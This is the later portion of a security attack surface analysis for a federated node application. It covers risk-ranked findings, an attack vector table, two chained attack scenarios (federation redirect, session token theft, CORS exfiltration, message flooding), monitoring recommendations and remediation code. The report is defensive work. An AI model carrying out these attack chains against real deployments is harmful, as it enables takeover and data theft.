6. **F-004: WebSocket Auth Unusable**
   - **Exploitability:** N/A (Defensive Failure)
   - **Impact:** MEDIUM
   - **Risk Score:** 5.0/10
   - **Rationale:** Prevents use of security control, forces insecure configuration
   - **Action:** Implement frontend auth handshake or document limitation

### LOW RISK (Address During Refactoring)

7. **F-007: Container Exec Shell Injection**
   - **Exploitability:** HARD (Requires container compromise)
   - **Impact:** LOW
   - **Risk Score:** 3.0/10
   - **Rationale:** Extremely difficult prerequisite, limited incremental impact
   - **Action:** Use exec with array arguments instead of shell

8. **F-009: CSP unsafe-inline/eval**
   - **Exploitability:** N/A (Defensive Weakening)
   - **Impact:** LOW
   - **Risk Score:** 2.5/10
   - **Rationale:** No XSS found, Vue.js provides strong protection
   - **Action:** Implement strict CSP for production builds

9. **F-008: Dead Registration Code**
   - **Exploitability:** N/A (Code Quality)
   - **Impact:** LOW
   - **Risk Score:** 1.0/10
   - **Rationale:** No security impact, just technical debt
   - **Action:** Remove or implement during code cleanup

---

## Attack Vector Summary

### Network-Based Attacks

| Finding | Vector | Port | Protocol | Auth Required |
|---------|--------|------|----------|---------------|
| F-001 | Federation API manipulation | 8090 | HTTP/HTTPS | NO ❌ |
| F-002 | Origin validation bypass | 8090 | HTTP/HTTPS/WS | NO ❌ |
| F-003 | WebSocket data leak | 8090 | WebSocket | NO ❌ |
| F-005 | Cross-origin requests | 8090 | HTTP/HTTPS | NO ❌ |
| F-006 | NATS message flood | 443 | WSS/NATS | NO ❌ |

### Chained Attack Scenarios

**Attack Chain 1: Complete Monitoring Takeover**
```
1. Exploit F-001 (Unauthenticated Federation)
   → Redirect to attacker's NATS server

2. Exploit F-003 (WebSocket executionId Leak)
   → Monitor real-time task execution

3. Exploit F-002 (Origin Bypass) + F-005 (CORS)
   → Steal session tokens from victim's browser

Result: Complete visibility into node operations + control of federation settings
```

**Attack Chain 2: Data Exfiltration + DoS**
```
1. Exploit F-005 (CORS Allow-All)
   → Exfiltrate task data from victim browsers

2. Exploit F-006 (Rate Limit Bypass)
   → Flood aggregator with fake statistics

3. Exploit F-001 (Federation Settings)
   → Disable federation to prevent monitoring

Result: Data theft + service disruption + covering tracks
```

---

## Detection and Monitoring Summary

### Recommended Security Monitoring

```yaml
Priority 1 (Critical - Implement Immediately):
  - Federation settings change alerts
  - Origin validation failure logging
  - WebSocket connection pattern analysis
  - Rate limit bypass detection

Priority 2 (High - Implement This Week):
  - CORS violation logging
  - Cross-origin request monitoring
  - Authentication failure tracking
  - Audit log access monitoring

Priority 3 (Medium - Implement This Month):
  - CSP violation reporting
  - File creation monitoring in containers
  - Session token usage analysis
  - Resource exhaustion detection
```

### Security Metrics Dashboard

```javascript
{
  "security_metrics": {
    "federation_changes": {
      "last_24h": 0,
      "threshold": 1,
      "status": "OK"
    },
    "origin_validation_failures": {
      "last_hour": 45,
      "threshold": 10,
      "status": "ALERT"  // Potential F-002 exploitation
    },
    "websocket_connections": {
      "total": 5,
      "authenticated": 0,  // F-004 issue
      "long_duration": 2,
      "status": "WARNING"
    },
    "rate_limit_bypasses": {
      "messages_without_nodeid": 50000,
      "threshold": 100,
      "status": "CRITICAL"  // F-006 exploitation
    },
    "cors_violations": {
      "last_hour": 120,
      "unique_origins": 15,
      "status": "ALERT"  // Potential F-005 exploitation
    }
  }
}
```

---

## Remediation Roadmap

### Phase 1: Critical Fixes (Week 1)

**F-001: Federation Authentication**
```javascript
// Require session token or API key for federation endpoints
router.use((req, res, next) => {
  const sessionToken = req.headers['x-session-token'];
  const apiKey = req.headers['authorization']?.replace('Bearer ', '');

  if (!validateSessionToken(sessionToken) && apiKey !== API_KEY) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  next();
});
```

**F-002: Origin Validation Fix**
```javascript
// Use proper URL parsing for origin validation
function validateOrigin(origin, allowedOrigins) {
  try {
    const originUrl = new URL(origin);
    return allowedOrigins.some(allowed => {
      const allowedUrl = new URL(allowed);
      return originUrl.origin === allowedUrl.origin;  // Exact match
    });
  } catch {
    return false;
  }
}
```

### Phase 2: High-Priority Fixes (Week 2)

**F-006: Rate Limiting Enhancement**
```javascript
// Reject messages without nodeId
function isRateLimited(nodeId) {
  if (!nodeId) {
    console.warn('[SECURITY] Message without nodeId rejected');
    return true;  // Block instead of allow
  }
  // ... existing rate limit logic
}
```

**F-003: WebSocket Sanitization**
```javascript
// Remove both snake_case and camelCase variations
const {
  input_data, output_data, error_data, execution_id,
  inputData, outputData, errorData, executionId,  // Add camelCase
  ...safe
} = data;
```

### Phase 3: Medium-Priority Fixes (Month 1)

**F-005: CORS Default Change**
**F-004: WebSocket Auth Implementation**
**F-007: Exec Command Hardening**
**F-009: Strict CSP for Production**

### Phase 4: Low-Priority Cleanup (Backlog)

**F-008: Remove Dead Code**

---

## Conclusion

This attack surface analysis identified **9 findings** ranging from critical remote control vulnerabilities to low-priority code quality issues. The most critical risks are:

1. **Unauthenticated federation endpoints** enabling remote manipulation
2. **Origin validation bypasses** allowing cross-origin attacks
3. **Rate limiting gaps** enabling DoS and data pollution

**Immediate Actions Required:**
- Implement authentication on federation endpoints (F-001)
- Fix origin validation logic (F-002)
- Enhance rate limiting (F-006)

**Defense-in-Depth Improvements:**
- Strict CORS policies (F-005)
- WebSocket authentication (F-004)
- Enhanced input validation (F-007)
- Production CSP hardening (F-009)

The application has a strong foundation with Docker isolation, privacy-focused federation, and challenge-response authentication. Addressing these findings will significantly strengthen the security posture and reduce attack surface.

---

**End of Attack Surface Analysis**
